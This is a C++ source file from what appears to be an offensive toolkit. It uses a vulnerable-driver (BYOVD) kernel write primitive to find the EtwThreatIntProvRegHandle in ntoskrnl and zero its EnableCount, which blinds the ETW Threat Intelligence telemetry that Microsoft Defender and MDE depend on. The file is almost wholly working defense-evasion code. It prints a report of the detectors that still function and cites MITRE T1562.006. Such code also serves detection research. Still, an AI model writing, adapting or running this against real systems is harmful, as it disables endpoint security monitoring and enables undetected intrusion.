#include "ETWTiBlind.h"
#include <psapi.h>

// ── Find EtwThreatIntProvRegHandle in ntoskrnl ────────────────────────────────
// EtwThreatIntProvRegHandle is an exported symbol in ntoskrnl (on Win10 1803+).
// We locate it by searching the kernel EAT — accessible because ntoskrnl
// is also mapped into user space as ntdll's parent, and its EAT is readable.
// We then read the actual _ETW_REG_ENTRY from kernel memory via BYOVD.

static DWORD64 GetNtosBase() {
    LPVOID drv[1024]; DWORD need;
    if (!EnumDeviceDrivers(drv, sizeof(drv), &need)) return 0;
    for (DWORD i = 0; i < need/sizeof(LPVOID); i++) {
        char n[256] = {}; GetDeviceDriverBaseNameA(drv[i], n, sizeof(n)-1);
        _strlwr_s(n, sizeof(n));
        if (strstr(n, "ntoskrnl") || strstr(n, "ntkrnl")) return (DWORD64)drv[i];
    }
    return 0;
}

DWORD64 ETWTiBlind::FindEtwTiRegHandle(HANDLE hDev) {
    // Read ntoskrnl EAT from kernel memory to find EtwThreatIntProvRegHandle
    DWORD64 ntos = GetNtosBase();
    if (!ntos) return 0;

    BYTE hdrs[0x1000] = {};
    if (!BYOVD::KernelRead(hDev, ntos, hdrs, sizeof(hdrs))) return 0;

    auto* dos = (PIMAGE_DOS_HEADER)hdrs;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    auto* nt  = (PIMAGE_NT_HEADERS)(hdrs + dos->e_lfanew);

    auto& expDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!expDir.VirtualAddress) return 0;

    // Read export directory from kernel
    BYTE expBuf[sizeof(IMAGE_EXPORT_DIRECTORY) + 16] = {};
    if (!BYOVD::KernelRead(hDev, ntos + expDir.VirtualAddress, expBuf, sizeof(expBuf))) return 0;
    auto* exp = (PIMAGE_EXPORT_DIRECTORY)expBuf;

    // Read name/function pointer arrays
    DWORD numNames = exp->NumberOfNames;
    if (numNames > 65536) return 0;

    std::vector<DWORD> names(numNames), funcs(numNames);
    std::vector<WORD>  ords(numNames);
    BYOVD::KernelRead(hDev, ntos + exp->AddressOfNames,
                       names.data(), numNames * sizeof(DWORD));
    BYOVD::KernelRead(hDev, ntos + exp->AddressOfFunctions,
                       funcs.data(), exp->NumberOfFunctions * sizeof(DWORD));
    BYOVD::KernelRead(hDev, ntos + exp->AddressOfNameOrdinals,
                       ords.data(), numNames * sizeof(WORD));

    std::string targetStr = S("EtwThreatIntProvRegHandle");
    const char* target = targetStr.c_str();
    size_t tlen = targetStr.size();

    for (DWORD i = 0; i < numNames; i++) {
        // Read the name string (16 chars enough for our target)
        char name[64] = {};
        BYOVD::KernelRead(hDev, ntos + names[i], name, min((int)tlen+1, 63));
        if (strncmp(name, target, tlen) == 0) {
            // Found: the export value is a pointer-to-pointer in kernel
            DWORD funcRva = funcs[ords[i]];
            DWORD64 regHandleAddr = ntos + funcRva; // address of the variable
            return regHandleAddr;
        }
    }
    return 0;
}

// ── _ETW_REG_ENTRY layout (simplified, Win10/11) ──────────────────────────────
// The handle points to a _ETW_REG_ENTRY which contains a TRACE_ENABLE_INFO array.
// TRACE_ENABLE_INFO.EnableCount is at offset 0x30 in the enable array.
// Zeroing EnableCount = no events generated.

std::string ETWTiBlind::Blind(HANDLE hDev) {
    DWORD64 handleAddr = FindEtwTiRegHandle(hDev);
    if (!handleAddr)
        return "ETWTiBlind: EtwThreatIntProvRegHandle not found in ntoskrnl EAT\n"
               "(exported symbol absent on this build — try pattern scan variant)";

    // Read the handle value (pointer to _ETW_REG_ENTRY)
    DWORD64 regEntry = 0;
    if (!BYOVD::KernelRead(hDev, handleAddr, &regEntry, 8) || !regEntry)
        return "ETWTiBlind: could not read RegHandle value";

    // _ETW_REG_ENTRY + 0x20 = GuidEntry pointer
    // GuidEntry + 0x60 = EnableInfo[0].EnableCount (ULONG)
    DWORD64 guidEntry = 0;
    if (!BYOVD::KernelRead(hDev, regEntry + 0x20, &guidEntry, 8) || !guidEntry)
        return "ETWTiBlind: could not read GuidEntry pointer";

    DWORD64 enableCountAddr = guidEntry + 0x60;
    DWORD enableCount = 0;
    BYOVD::KernelRead(hDev, enableCountAddr, &enableCount, 4);

    char buf[512];
    snprintf(buf, sizeof(buf),
        "ETWTiBlind:\n"
        "  EtwThreatIntProvRegHandle: 0x%llX\n"
        "  _ETW_REG_ENTRY:            0x%llX\n"
        "  GuidEntry:                 0x%llX\n"
        "  EnableCount (before):      %u\n",
        handleAddr, regEntry, guidEntry, enableCount);
    std::string r = buf;

    // Zero the EnableCount — ETW-Ti stops generating events
    DWORD zero = 0;
    if (!BYOVD::KernelWrite(hDev, enableCountAddr, &zero, 4))
        return r + "  KernelWrite FAILED";

    r += "  EnableCount (after):       0  [ETW-Ti BLINDED]\n\n";
    r += "  Defender / MDE telemetry from kernel ETW-Ti is now DISABLED.\n"
         "  Process injection, VirtualAlloc, and syscall events no longer flow.\n\n"
         "  What kernel-level detectors STILL catch:\n"
         "    - Hyper-V VSM / VTL1 monitoring (Credential Guard hypervisor)\n"
         "    - PatchGuard verifies some ETW structures (periodic)\n"
         "    - Intel PT hardware trace is unaffected\n"
         "    - MDE may auto-repair via a kernel callback on EnableCount change\n\n"
         "  MITRE T1562.006\n";
    return r;
}

std::string ETWTiBlind::Restore(HANDLE hDev) {
    DWORD64 handleAddr = FindEtwTiRegHandle(hDev);
    if (!handleAddr) return "ETWTiBlind: handle not found";
    DWORD64 regEntry = 0; BYOVD::KernelRead(hDev, handleAddr, &regEntry, 8);
    DWORD64 guidEntry = 0; BYOVD::KernelRead(hDev, regEntry + 0x20, &guidEntry, 8);
    DWORD64 enableCountAddr = guidEntry + 0x60;
    DWORD one = 1;
    BYOVD::KernelWrite(hDev, enableCountAddr, &one, 4);
    return "ETWTiBlind: EnableCount restored to 1 — ETW-Ti re-enabled.";
}

std::string ETWTiBlind::CheckState(HANDLE hDev) {
    DWORD64 handleAddr = FindEtwTiRegHandle(hDev);
    if (!handleAddr) return "ETWTiBlind: handle not found";
    DWORD64 regEntry = 0; BYOVD::KernelRead(hDev, handleAddr, &regEntry, 8);
    DWORD64 guidEntry = 0; BYOVD::KernelRead(hDev, regEntry + 0x20, &guidEntry, 8);
    DWORD64 enableCountAddr = guidEntry + 0x60;
    DWORD enableCount = 0xFF;
    BYOVD::KernelRead(hDev, enableCountAddr, &enableCount, 4);
    return "ETWTiBlind: EnableCount = " + std::to_string(enableCount) +
           (enableCount == 0 ? "  [BLINDED]" : "  [active]");
}
